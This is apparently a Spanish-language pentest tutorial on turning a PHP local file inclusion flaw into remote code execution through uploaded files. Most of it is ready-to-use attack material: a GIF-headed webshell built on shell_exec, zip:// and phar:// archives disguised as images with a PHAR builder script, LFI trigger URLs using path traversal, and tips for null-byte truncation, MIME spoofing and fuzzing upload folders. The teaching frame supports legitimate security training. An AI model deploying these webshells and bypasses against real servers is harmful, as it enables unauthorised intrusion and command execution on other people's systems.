
**Cómo transformar una vulnerabilidad LFI en ejecución remota aprovechando archivos que la propia aplicación nos permite subir.**

---

# **1. Idea principal del ataque**

Muchas aplicaciones modernas permiten a los usuarios subir imágenes: avatares, banners, documentos, etc.  
Aunque el formulario de subida esté “bien protegido” (filtra extensiones, inspecciona MIME, verifica magic-bytes…), **el vector débil no es el upload, sino la función vulnerable de File Inclusion.**

Si el backend incluye archivos usando funciones que **ejecutan** código, cualquier archivo subido por nosotros —aunque tenga extensión “inocente”— puede convertirse en un _loader_ para ejecutar PHP y obtener **RCE**.

El upload solo sirve como **almacén**:  
el LFI es lo que realmente dispara el código.

---

# **2. Funciones peligrosas en distintos lenguajes**

Cuando una función ejecuta el contenido incluido, _la extensión da igual_.  
(Clave para entender el ataque: **incluye ≠ mostrar**)

|Lenguaje|Función|Lee|Ejecuta|URL remota|
|---|---|---|---|---|
|**PHP**|`include()`, `require()`|Sí|Sí|Sí / No (depende)|
|**Node.js**|`res.render()` con plantillas|Sí|Sí (plantilla)|No|
|**Java**|imports dinámicos o JSP includes|Sí|Sí|Sí|
|**.NET**|Includes de views / Razor parsing|Sí|Sí|Sí|

En este módulo el ejemplo clásico es PHP, porque es donde más control tenemos sobre wrappers y payloads.

---

# **3. Subida de imagen → RCE vía LFI**

## **3.1 Objetivo**

Subir un archivo con apariencia de imagen pero que contiene código ejecutable.

_Da igual la extensión:_ `.jpg`, `.png`, `.gif`.

Lo único importante es colocar **los bytes mágicos iniciales correctos** y añadir PHP después.

### Ejemplo con GIF (bytes ASCII fáciles):

```bash
echo -e "GIF89a\n<?php echo shell_exec($_GET['cmd']); ?>" > avatar.gif
```

- `GIF89a` → validación de cabecera
    
- El código PHP no afecta al renderizado de la imagen
    
- Para la aplicación, sigue siendo un “avatar”
    
- Para el LFI, es código ejecutable
    

# **4. Subir el archivo y localizarlo**

Tras subir la imagen, normalmente podremos ver la ruta final revisando el HTML:

```html
<img src="/uploads/profile/usuario/avatar.gif">
```

Cosas que debes mirar:

- ¿La ruta está en el HTML?
    
- ¿El nombre de archivo lo genera el servidor?
    
- ¿Lo mete en una carpeta por usuario?
    
- ¿Se renombra? (ej. hash o timestamp)
    
- ¿La ruta es pública o está protegida?)
    

Si no conoces la ruta:  
→ fuzz con `ffuf /dirsearch`, o  
→ fuzz nombres usando patrones (`*.jpg`, `*.gif`, etc.)

---

# **5. Disparo del payload vía LFI**

Una vez sabemos dónde está el archivo, basta con incluirlo:

```
http://victima/app/view.php?tpl=../../uploads/profile/usuario/avatar.gif&cmd=whoami
```

o si está en el mismo directorio:

```
?tpl=./uploads/profile/avatar.gif&cmd=id
```

Si todo está alineado:  
**RCE directa.**

---

# **6. Prefijos, sufijos y cómo saltárselos**

Las aplicaciones suelen manipular la ruta antes de incluirla. Algunos trucos:

### **6.1 Prefijo fijo**

```php
include("themes/" . $_GET['tpl']);
```

Solución: escapar con traversal:

```
tpl=../../../../uploads/profile/avatar.gif
```

### **6.2 Sufijo fijo**

```php
include($_GET['tpl'] . ".php");
```

Soluciones posibles:

- Usar wrappers (`php://filter`, `zip://`, `phar://`)
    
- Intentar null byte (solo versiones antiguas)
    
- Encodings raros para truncar (`%00`, `%0a`, `%0d`)
    
- Subir archivo que contenga código _dentro_ de un formato que sí se interprete
    

Por eso las técnicas de zip/phar —explicadas después— son tan útiles:  
**permiten ejecutar PHP aunque el include añada `.php` al final**.

---

# **7. Técnica alternativa 1: ZIP Wrapper (PHP)**

El wrapper `zip://` permite tratar un `.zip` como si fuera un sistema de archivos virtual.

### **7.1 Crear un ZIP que parezca una imagen**

```bash
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > minishell.php
zip avatar.png minishell.php
```

- Nombre: `avatar.png`
    
- Contenido: fichero PHP comprimido
    
- Si la aplicación solo mira la extensión, pasará.
    

### **7.2 Disparar vía LFI**

```
?tpl=zip://./uploads/avatar.png%23minishell.php&cmd=id
```

El `%23` es `#` en URL encoding, obligatorio.

Si el servidor tiene el wrapper `zip://` habilitado:  
→ **RCE inmediata**.

---

# **8. Técnica alternativa 2: PHAR Wrapper**

`phar://` permite leer archivos tipo PHAR (archivos PHP empaquetados).  
Son muy potentes para bypass de validaciones, aunque requieren:

- `phar.readonly = Off`
    
- Tener PHP compilado con soporte para Phar (default)
    

### **8.1 Crear un PHAR disfrazado de imagen**

```php
<?php
$ph = new Phar('payload.phar');
$ph->startBuffering();
$ph->addFromString('w.php', '<?php echo shell_exec($_GET["cmd"]); ?>');
$ph->setStub('<?php __HALT_COMPILER(); ?>');
$ph->stopBuffering();
?>
```

Generar:

```bash
php -d phar.readonly=0 builder.php
mv payload.phar avatar.jpg
```

### **8.2 Lanzar el ataque**

```
?tpl=phar://./uploads/avatar.jpg/w.php&cmd=id
```

Si funciona → RCE silenciosa y bastante sigilosa.

---

# **9. ¿Cuál técnica usar primero? (Prioridad en pentest)**

1. **Imagen con código + LFI directo** (lo más fiable)
    
2. **ZIP wrapper** (buen bypass para sufijos `.php`)
    
3. **PHAR wrapper** (menos común pero muy eficaz)
    
4. Técnicas más antiguas / específicas:
    
    - null byte (`%00`)
        
    - phpinfo + tmp upload
        
    - filtros de PHP (`php://filter`)
        

---

# **10. Consejos prácticos para el pentester**

- Subir varios archivos con distintos formatos por si la app renombra.
    
- No uses solo `.jpg`: prueba `.gif`, `.webp`, `.svg`, `.ico`.
    
- Cuando tengas LFI, intenta inclusión desde diferentes rutas relativas.
    
- Usa Burp para repetir subida con cabeceras alteradas.
    
- Si la app comprueba MIME → falsifícalo.
    
- Si reescribe nombres → fuzzéo dentro de la carpeta de uploads.
